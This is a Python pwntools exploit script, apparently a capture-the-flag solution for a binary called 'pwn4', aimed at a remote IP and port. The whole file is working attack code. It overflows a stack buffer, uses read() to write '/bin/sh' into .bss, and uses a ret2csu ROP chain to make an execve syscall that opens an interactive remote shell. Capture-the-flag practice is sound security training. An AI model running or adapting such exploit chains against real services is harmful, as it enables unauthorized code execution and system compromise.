from pwn import *

# p = process('./pwn4')
p = remote('34.64.159.111', 12775)
e = ELF('./pwn4')
l = e.libc

csu = 0x00000000004006AA
setting = 0x0000000000400690
sh = e.bss()+0x100
prdi = 0x00000000004006b3
prsi = 0x00000000004006b1
syscall = 0x00000000004005eb

payload = 'A'*0x18
payload += p64(prdi)
payload += p64(0)
payload += p64(prsi)
payload += p64(sh)
payload += p64(0)
payload += p64(e.plt['read'])
payload += p64(e.symbols['main'])

p.send(payload)
sleep(0.3)
p.send('/bin/sh\x00')

# rax = 0x3b rdi = binsh rdx =0 rsi =0
payload = 'A'*0x18
payload += p64(prdi)
payload += p64(0)
payload += p64(prsi)
payload += p64(e.bss()+0x200)
payload += p64(0)
payload += p64(e.plt['read'])

payload += p64(csu)
payload += p64(0)
payload += p64(1)
payload += p64(e.bss()+0x200)
payload += p64(sh)
payload += p64(0)
payload += p64(0)
payload += p64(setting)

p.send(payload)
sleep(0.3)
p.send(p64(syscall) + 'A'*51)

p.interactive()